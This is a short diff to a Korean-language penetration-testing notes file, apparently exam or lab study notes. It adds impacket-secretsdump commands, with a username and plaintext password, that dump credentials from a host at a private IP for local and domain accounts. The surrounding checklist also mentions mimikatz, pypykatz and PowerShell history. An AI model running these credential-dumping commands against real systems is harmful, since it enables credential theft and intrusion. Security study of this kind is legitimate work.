@@ -129,6 +129,13 @@
 - 셸을 획득할 때마다 내부 파일 살펴보기
 - powershell history
 - pypykatz/secretsdump
+```bash
+# 기본 로컬 인증
+impacket-secretsdump Eric.Wallows:EricLikesRunning800@192.168.220.159
+
+# 도메인 인증
+impacket-secretsdump DOMAIN/Eric.Wallows:EricLikesRunning800@192.168.220.159
+```
 - mimikatz
 ```bash
 # mimikatz 대신에 사용 가능.
